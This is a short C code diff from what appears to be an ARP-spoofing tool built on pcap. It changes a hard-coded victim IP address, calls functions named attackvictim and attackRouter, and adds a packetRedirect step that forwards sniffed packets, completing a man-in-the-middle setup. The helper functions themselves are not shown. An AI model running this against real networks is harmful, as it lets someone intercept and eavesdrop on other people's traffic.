@@ -6,7 +6,7 @@ int main()
 	pcap_if_t *alldevs, *choiceDev;
 	pcap_t* handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char victimIP[16] = "192.168.50.146";
+	char victimIP[16] = "192.168.50.135";
 
 	/* Retrieve the device list from the local machine */
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
@@ -45,12 +45,12 @@ int main()
 		else
 			printf("%.2X-", LanInfo.gatewayMAC[i]);
 	}
-	HEADER TEST_header;
+	ARPHEADER TEST_header;
 	setArpHeader(&TEST_header);
 	attackvictim(handle, &TEST_header, &LanInfo);
 	Sleep(500);
 	attackRouter(handle, &TEST_header, &LanInfo);
-	/* sniff packet */
+	// sniff packet 
 	int res;
 	struct pcap_pkthdr* header;
 	const u_char* packet;
@@ -58,7 +58,12 @@ int main()
 	{
 		if (res == 0)
 			continue;
-		checkARP(handle, packet, &LanInfo);
+		if (checkARP(handle, packet, &LanInfo))
+			continue;
+		else
+		{
+			packetRedirect(handle, header, packet, &LanInfo);
+		}
 	}
 	if (res == -1) {
 		printf("Error reading the packets: %s\n", pcap_geterr(handle));
